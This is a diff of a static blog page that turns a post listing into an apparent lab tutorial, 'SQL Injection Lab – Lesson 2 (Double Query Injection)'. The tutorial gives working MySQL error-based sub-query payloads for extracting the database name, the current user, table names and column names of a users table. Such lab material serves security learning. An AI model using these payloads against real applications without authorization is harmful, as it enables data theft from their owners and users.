@@ -47,20 +47,20 @@
 
 
 
-  
-  
-  
 
 
+  
+  
+  
 
 
 <!-- Open Graph image and Twitter Card metadata -->
 
-<title itemprop="name">r00tpunk - Posts</title>
-<meta property="og:title" content=r00tpunk&#32;-&#32;Posts />
-<meta name="twitter:title" content=r00tpunk&#32;-&#32;Posts />
-<meta itemprop="name" content=r00tpunk&#32;-&#32;Posts />
-<meta name="application-name" content=r00tpunk&#32;-&#32;Posts />
+<title itemprop="name">r00tpunk - SQL Injection Lab – Lesson 2 (Double Query Injection)</title>
+<meta property="og:title" content=r00tpunk&#32;-&#32;SQL&#32;Injection&#32;Lab&#32;–&#32;Lesson&#32;2&#32;(Double&#32;Query&#32;Injection) />
+<meta name="twitter:title" content=r00tpunk&#32;-&#32;SQL&#32;Injection&#32;Lab&#32;–&#32;Lesson&#32;2&#32;(Double&#32;Query&#32;Injection) />
+<meta itemprop="name" content=r00tpunk&#32;-&#32;SQL&#32;Injection&#32;Lab&#32;–&#32;Lesson&#32;2&#32;(Double&#32;Query&#32;Injection) />
+<meta name="application-name" content=r00tpunk&#32;-&#32;SQL&#32;Injection&#32;Lab&#32;–&#32;Lesson&#32;2&#32;(Double&#32;Query&#32;Injection) />
 <meta property="og:site_name" content="r00tpunk" />
 
 
@@ -70,18 +70,17 @@
 <meta name="twitter:description" content="" />
 
 
-<base href="https://r00tpunk.github.io/posts/" />
-<link rel="canonical" href="https://r00tpunk.github.io/posts/" itemprop="url" />
-<meta name="url" content="https://r00tpunk.github.io/posts/" />
-<meta name="twitter:url" content="https://r00tpunk.github.io/posts/" />
-<meta property="og:url" content="https://r00tpunk.github.io/posts/" />
+<base href="https://r00tpunk.github.io/posts/learning/less2/" />
+<link rel="canonical" href="https://r00tpunk.github.io/posts/learning/less2/" itemprop="url" />
+<meta name="url" content="https://r00tpunk.github.io/posts/learning/less2/" />
+<meta name="twitter:url" content="https://r00tpunk.github.io/posts/learning/less2/" />
+<meta property="og:url" content="https://r00tpunk.github.io/posts/learning/less2/" />
 
 
 <meta property="og:updated_time" content="2025-09-22T00:00:00Z" />
 
 
 <link rel="sitemap" type="application/xml" title="Sitemap" href='https://r00tpunk.github.io/sitemap.xml' />
-<link href="https://r00tpunk.github.io/posts/index.xml" rel="alternate" type="application/rss+xml" title="r00tpunk" />
 
 <meta name="robots" content="index,follow" />
 <meta name="googlebot" content="index,follow" />
@@ -94,25 +93,6 @@
 <meta name="apple-mobile-web-app-title" content="r00tpunk" />
 <meta name="apple-mobile-web-app-capable" content="yes" />
 <meta name="apple-mobile-web-app-status-bar-style" content="black" />
-
-
-
-
-
-
-
-  <link rel="first" href="/posts/" />
-  <link rel="last" href="/posts/" />
-  
-  
-
-
-<meta property="og:type" content="article" />
-<meta property="article:publisher" content="" />
-<meta property="og:article:published_time" content="2025-09-22T00:00:00Z" />
-<meta property="article:published_time" content="2025-09-22T00:00:00Z" />
-
-
 
 
 
@@ -379,40 +359,126 @@
 </aside>
 
             <main class="content container">
-                <h1 class="title">Posts</h1>
+                <div class="post">
+  <div class="info">
+  <h1 class="post-title">
+    <a href="https://r00tpunk.github.io/posts/learning/less2/">SQL Injection Lab – Lesson 2 (Double Query Injection)</a>
+  </h1>
 
+  <div class="headline">
+    <div>
+      
+      
+      <time datetime=" 2025-09-22T00:00:00Z" class="post-date">
+        September 22, 2025
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
 
-<div class="list-content">
+        <span>2 mins read</span>
+      </span>
+    </div>
+
+    
+    <ul class="tags">
+      
+      <li class="tag-SQL Injection">
+        <a href="https://r00tpunk.github.io/tags/sql-injection">SQL Injection</a>
+      </li>
+      
+      <li class="tag-Double Query Injection">
+        <a href="https://r00tpunk.github.io/tags/double-query-injection">Double Query Injection</a>
+      </li>
+      
+      <li class="tag-Web Security">
+        <a href="https://r00tpunk.github.io/tags/web-security">Web Security</a>
+      </li>
+      
+      <li class="tag-Labs">
+        <a href="https://r00tpunk.github.io/tags/labs">Labs</a>
+      </li>
+      
+    </ul>
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+  <h1 id="double-query-sub-query-injection">Double Query (Sub-Query) Injection</h1>
+<h2 id="find-injectable-parameter">Find injectable parameter</h2>
+<ol>
+<li>Look for parameters placed inside single quotes: <code>id='...</code></li>
+<li>Confirm the app shows errors or returns a page that changes on bad input (even if message hidden — error may still be logged).</li>
+</ol>
+<p>If the response changes, parameter is injectable. If you get SQL error, good — proceed carefully.</p>
+<h2 id="dumping-database-name">Dumping database name</h2>
+<p>Payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; AND (select 1 from (select count(*), concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))a from information_schema.columns group by a)b) --+
+</span></span></span></code></pre></div><p>if error shows <em><strong>DataBase name</strong></em>, you succeeded.
+<img src="/sqli-02/ss1.jpg" alt="Alt text"></p>
+<h2 id="dumping-current-user">Dumping current-user</h2>
+<p>Payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; AND (select 1 from (select count(*), concat(0x3a,0x3a,(select current_user()),0x3a,0x3a, floor(rand()*2))a from information_schema.columns group by a)b) --+
+</span></span></span></code></pre></div><p>you can see the <em><strong>current_user</strong></em> in the error.</p>
+<p><img src="/sqli-02/ss2.jpg" alt="Alt text"></p>
+<h2 id="dumping-tables">Dumping tables</h2>
+<p>Payloads:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; AND (select 1 from (select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database()limit 0,1),0x3a,0x3a, floor(rand()*2))a from information_schema.columns group by a) b)%20 --+
+</span></span></span></code></pre></div><p>you can see the <em><strong>tables</strong></em> in error.</p>
+<p><img src="/sqli-02/ss3.jpg" alt="Alt text"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; AND (select 1 from (select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database()limit 1,1),0x3a,0x3a, floor(rand()*2))a from information_schema.columns group by a) b)%20 --+
+</span></span></span></code></pre></div><p><img src="/sqli-02/ss4.jpg" alt="Alt text"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; AND (select 1 from (select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database()limit 2,1),0x3a,0x3a, floor(rand()*2))a from information_schema.columns group by a) b)%20 --+
+</span></span></span></code></pre></div><p><img src="/sqli-02/ss5.jpg" alt="Alt text"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; AND (select 1 from (select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database()limit 3,1),0x3a,0x3a, floor(rand()*2))a from information_schema.columns group by a) b)%20 --+
+</span></span></span></code></pre></div><p><img src="/sqli-02/ss6.jpg" alt="Alt text"></p>
+<h2 id="dumping-data-from-tables">Dumping data from tables</h2>
+<p>Payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; AND (select 1 from (select count(*), concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name=&#39;</span>users<span style="color:#e6db74">&#39; limit 0,1),0x3a,0x3a, floor(rand()*2))a from information_schema.columns group by a) b)%20 --+
+</span></span></span></code></pre></div><p><img src="/sqli-02/ss7.jpg" alt="Alt text"></p>
+<p>You can dump more data by changing the <em><strong>limit</strong></em> in querry.</p>
+
+  
+  <hr>
+<div class="footer">
+    
+	    
+            <a class="previous-post" href="https://r00tpunk.github.io/posts/learning/less1/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>SQL Injection Lab – Lesson 1 (Error-Based: String)</a>
+        
+	    
     
 </div>
 
-<ul class="entries">
-    
-        <h3 style="text-align: center;">2025</h3>
-        
-            <li class="entry-item">
-                <span class="title">
-                    <a href="/posts/learning/">Learning</a>
-                </span>
-                <span class="published">
-                    <time class="post-list">Sep 22, 2025</time>
-                </span>
-            </li>
-        
-            <li class="entry-item">
-                <span class="title">
-                    <a href="/posts/ctf/">CTF Archive</a>
-                </span>
-                <span class="published">
-                    <time class="post-list">Aug 24, 2025</time>
-                </span>
-            </li>
-        
-    
-</ul>
-
+  
+</div>
             </main>
             
+  
+    <div class="article-toc ">
+    <div class="toc-wrapper">
+      <h4 id="contents"></h4>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#find-injectable-parameter">Find injectable parameter</a></li>
+    <li><a href="#dumping-database-name">Dumping database name</a></li>
+    <li><a href="#dumping-current-user">Dumping current-user</a></li>
+    <li><a href="#dumping-tables">Dumping tables</a></li>
+    <li><a href="#dumping-data-from-tables">Dumping data from tables</a></li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+  
+
         </div>
     </body>
 </html>
